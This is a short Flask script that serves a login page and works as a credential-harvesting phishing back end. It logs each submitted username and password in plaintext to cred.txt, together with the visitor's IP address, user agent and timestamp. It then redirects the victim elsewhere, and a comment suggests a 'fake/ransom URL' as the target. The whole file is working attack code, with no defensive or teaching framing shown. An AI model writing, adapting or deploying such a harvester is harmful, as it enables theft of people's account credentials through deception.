from flask import Flask, request, redirect, render_template
import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now()

    with open("cred.txt", "a") as f:
        f.write(f"{timestamp} | IP: {ip} | UA: {ua} | Username: {username} | Password: {password}\n")

    return redirect("https://www.google.com/")  # Replace with any fake/ransom URL

if __name__ == "__main__":
    app.run(debug=True)
